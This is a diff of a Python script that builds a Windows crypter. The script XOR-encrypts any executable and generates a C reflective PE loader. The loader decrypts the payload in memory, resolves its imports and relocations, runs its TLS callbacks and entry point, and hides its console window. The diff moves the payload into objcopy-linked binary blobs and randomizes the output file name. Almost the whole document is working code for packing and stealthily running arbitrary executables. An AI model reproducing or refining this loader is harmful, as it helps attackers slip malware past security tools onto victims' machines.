@@ -3,14 +3,13 @@ import sys
 import subprocess
 import random
 import string
-import shutil
 
 def generate_random_name():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 def build_single_exe_with_dll(exe_path):
     print("=" * 60)
-    print("PROFESSIONAL REFLECTIVE DLL LOADER")
+    print("PROFESSIONAL BINARY REFLECTIVE LOADER")
     print("=" * 60)
     
     if not os.path.exists(exe_path):
@@ -36,52 +35,40 @@ def build_single_exe_with_dll(exe_path):
     for i, byte in enumerate(exe_data):
         encrypted.append(byte ^ key[i % len(key)])
     
-    # Встраиваем данные как массив байт
-    data_hex = encrypted.hex()
-    key_hex = key.hex()
+    # Сохраняем как бинарные .bin файлы
+    data_bin = os.path.join(output_dir, 'data.bin')
+    with open(data_bin, 'wb') as f:
+        f.write(encrypted)
     
-    print("Creating reflective loader...")
+    key_bin = os.path.join(output_dir, 'key.bin')
+    with open(key_bin, 'wb') as f:
+        f.write(key)
     
-    loader_code = f'''
+    print("Creating loader with embedded binary...")
+    
+    loader_code = '''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
-#pragma comment(linker, "/MERGE:.rdata=.data")
-#pragma comment(linker, "/MERGE:.text=.data")
-#pragma comment(linker, "/SECTION:.data,EWR")
 
-// Encrypted payload
-static const unsigned char payload[] = 
-    "{data_hex}";
-static const size_t payload_len = {len(encrypted)};
-
-static const unsigned char xkey[] = 
-    "{key_hex}";
-static const size_t key_len = {len(key)};
-
-// Hex to byte
-unsigned char h2b(char c) {{
-    if (c >= '0' && c <= '9') return c - '0';
-    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
-    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
-    return 0;
-}}
+// Внешние бинарные данные (линкуются через objcopy)
+extern unsigned char _binary_data_bin_start[];
+extern unsigned char _binary_data_bin_end[];
+extern unsigned char _binary_key_bin_start[];
+extern unsigned char _binary_key_bin_end[];
 
 // Reflective PE loader
-void run_pe(unsigned char* pe_data, size_t pe_size) {{
-    // Check MZ
+void run_pe(unsigned char* pe_data, size_t pe_size) {
     if (pe_data[0] != 'M' || pe_data[1] != 'Z') return;
     
-    // Get PE header
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_data;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe_data + dos->e_lfanew);
     
     if (nt->Signature != IMAGE_NT_SIGNATURE) return;
     
-    // Allocate memory in current process
     size_t image_size = nt->OptionalHeader.SizeOfImage;
     unsigned char* base = (unsigned char*)VirtualAlloc(
         NULL, image_size, MEM_COMMIT | MEM_RESERVE, 
@@ -89,110 +76,120 @@ void run_pe(unsigned char* pe_data, size_t pe_size) {{
     );
     if (!base) return;
     
-    // Copy headers
     memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);
     
-    // Copy sections
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {{
-        if (section[i].SizeOfRawData) {{
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (section[i].SizeOfRawData) {
             memcpy(base + section[i].VirtualAddress, 
                    pe_data + section[i].PointerToRawData, 
                    section[i].SizeOfRawData);
-        }}
-    }}
+        }
+    }
     
-    // Relocations
     DWORD delta = (DWORD)base - nt->OptionalHeader.ImageBase;
-    if (delta) {{
+    if (delta) {
         PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(
             base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
         );
-        while (rel->VirtualAddress) {{
+        while (rel->VirtualAddress) {
             DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
             WORD* entries = (WORD*)(rel + 1);
-            for (DWORD i = 0; i < count; i++) {{
-                if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {{
+            for (DWORD i = 0; i < count; i++) {
+                if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                     DWORD* addr = (DWORD*)(base + rel->VirtualAddress + (entries[i] & 0xFFF));
                     *addr += delta;
-                }}
-            }}
+                }
+            }
             rel = (PIMAGE_BASE_RELOCATION)((char*)rel + rel->SizeOfBlock);
-        }}
-    }}
+        }
+    }
     
-    // IAT
     PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(
         base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
     );
-    while (imp->Name) {{
+    while (imp->Name) {
         HMODULE h = LoadLibraryA((char*)base + imp->Name);
         PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
         PIMAGE_THUNK_DATA func = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
-        while (thunk->u1.Function) {{
-            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {{
+        while (thunk->u1.Function) {
+            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                 func->u1.Function = (DWORD)GetProcAddress(h, (char*)(thunk->u1.Ordinal & 0xFFFF));
-            }} else {{
+            } else {
                 PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
                 func->u1.Function = (DWORD)GetProcAddress(h, name->Name);
-            }}
+            }
             thunk++;
             func++;
-        }}
+        }
         imp++;
-    }}
+    }
     
-    // TLS
-    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress) {{
+    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress) {
         PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(
             base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress
         );
-        if (tls->AddressOfCallBacks) {{
+        if (tls->AddressOfCallBacks) {
             PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
-            while (*callback) {{
+            while (*callback) {
                 (*callback)(base, DLL_PROCESS_ATTACH, NULL);
                 callback++;
-            }}
-        }}
-    }}
+            }
+        }
+    }
     
-    // Entry point
     DWORD entry = nt->OptionalHeader.AddressOfEntryPoint;
-    if (entry) {{
+    if (entry) {
         ((void(*)()) (base + entry))();
-    }}
-}}
+    }
+}
 
-void run_payload() {{
-    // Decrypt
-    unsigned char* decrypted = (unsigned char*)malloc(payload_len / 2);
+void run_payload() {
+    // Получаем данные из бинарных секций
+    size_t data_size = _binary_data_bin_end - _binary_data_bin_start;
+    size_t key_size = _binary_key_bin_end - _binary_key_bin_start;
+    
+    unsigned char* data = _binary_data_bin_start;
+    unsigned char* key = _binary_key_bin_start;
+    
+    // Копируем и расшифровываем
+    unsigned char* decrypted = (unsigned char*)malloc(data_size);
     if (!decrypted) return;
+    memcpy(decrypted, data, data_size);
     
-    for(size_t i = 0; i < payload_len / 2; i++) {{
-        decrypted[i] = (h2b(payload[i*2]) << 4) | h2b(payload[i*2+1]);
-    }}
+    for (size_t i = 0; i < data_size; i++) {
+        decrypted[i] ^= key[i % key_size];
+    }
     
-    // XOR decrypt
-    for(size_t i = 0; i < payload_len / 2; i++) {{
-        decrypted[i] ^= xkey[i % key_len];
-    }}
+    if (decrypted[0] != 'M' || decrypted[1] != 'Z') {
+        MessageBoxA(NULL, "Not a valid EXE!", "Error", MB_OK);
+        free(decrypted);
+        return;
+    }
     
-    // Run reflective PE
-    run_pe(decrypted, payload_len / 2);
-    
+    run_pe(decrypted, data_size);
     free(decrypted);
-}}
+}
 
-int main() {{
+int main() {
     run_payload();
     Sleep(15000);
     return 0;
-}}
+}
 '''
     
     loader_src = os.path.join(output_dir, 'loader.c')
     with open(loader_src, 'w', encoding='utf-8') as f:
         f.write(loader_code)
+    
+    print("Creating binary objects...")
+    
+    # Конвертируем .bin в .o с помощью objcopy
+    data_obj = os.path.join(output_dir, 'data.o')
+    key_obj = os.path.join(output_dir, 'key.o')
+    
+    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf32-i386', '-B', 'i386', data_bin, data_obj], capture_output=True)
+    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf32-i386', '-B', 'i386', key_bin, key_obj], capture_output=True)
     
     print("Compiling reflective loader...")
     loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
@@ -200,6 +197,8 @@ int main() {{
     cmd = [
         'gcc',
         loader_src,
+        data_obj,
+        key_obj,
         '-o', loader_exe,
         '-O3',
         '-s',
@@ -230,8 +229,13 @@ int main() {{
     print(f"Size: {final_size:.2f} MB")
     print("=" * 60)
     
+    # Cleanup
     try:
         os.remove(loader_src)
+        os.remove(data_bin)
+        os.remove(key_bin)
+        os.remove(data_obj)
+        os.remove(key_obj)
     except:
         pass
     
